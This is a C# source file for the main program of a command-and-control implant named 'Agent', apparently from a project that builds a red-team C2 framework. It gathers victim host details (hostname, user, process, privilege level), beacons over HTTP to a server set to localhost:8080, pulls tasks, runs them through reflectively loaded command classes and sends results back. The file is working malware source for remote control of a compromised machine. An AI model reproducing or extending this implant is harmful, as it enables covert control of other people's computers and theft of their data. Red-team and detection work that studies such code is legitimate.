using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent
{
    class Program
    {
        private static AgentMetadata _metadata;
        private static CommModule _commModule;
        private static CancellationTokenSource _tokenSource;

        private static List<AgentCommand> _commands = new List<AgentCommand>();
        static void Main(string[] args)
        {
            GenerateMetadata();
            LoadAgentCommands();

            _commModule = new HttpCommModule("localhost", 8080);
            _commModule.Init(_metadata);
            _commModule.Start();

            _tokenSource = new CancellationTokenSource();
            while (!_tokenSource.IsCancellationRequested)
            {
                if (_commModule.RecvData(out var tasks))
                {
                    HandleTasks(tasks);
                }
            }
        }

        private static void HandleTasks(IEnumerable<AgentTask> tasks)
        {
            foreach (var task in tasks)
            {
                HandleTask(task);
            }
        }

        private static void HandleTask(AgentTask task)
        {
            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.OrdinalIgnoreCase));
            if (command is null)
            {
                SendTaskResult(task.Id, "Command not found");
                return;
            }

            if (command == null) return;

            try
            {
                var result = command.Execute(task);
                SendTaskResult(task.Id, result);
            } 
            catch (Exception e)
            {
                SendTaskResult(task.Id, e.Message);
            }
        }

        private static void SendTaskResult(string taskId, string result)
        {
            var taskResult = new AgentTaskResult
            {
                Id = taskId,
                Result = result
            };

            _commModule.SendData(taskResult);
        }

        public void Stop()
        {
            _tokenSource.Cancel();
        }

        private static void LoadAgentCommands()
        {
            var self = Assembly.GetExecutingAssembly();

            // type is a class
            foreach (var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(AgentCommand)))
                {
                    var instance = (AgentCommand)Activator.CreateInstance(type); // instanstiate class aka (new "Class")
                    _commands.Add(instance);
                }
            }
        }

        private static void GenerateMetadata()
        {
            var process = Process.GetCurrentProcess();
            var username = Environment.UserName;
            var integrity = "Medium"; // assume Medium integrity by default

            if (username.Equals("SYSTEM"))
                integrity = "SYSTEM";

            // User: the person who is currently logged into the computer
            // Owner: the person/group that created this file
            // checks if process is running in elevated privileges???
            using (var identity = WindowsIdentity.GetCurrent())
            {
                if (identity.User != identity.Owner)
                {
                    integrity = "High";
                }
            }

            _metadata = new AgentMetadata
            {
                Id = Guid.NewGuid().ToString(),
                Hostname = Environment.MachineName, // can be spoofed, can consider using DNS look-up instead to get hostname from DNS (more reliable)
                Username = username,
                ProcessName = process.ProcessName,
                ProcessId = process.Id,
                Integrity = integrity,
                Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86"
            };
        }
    }
}
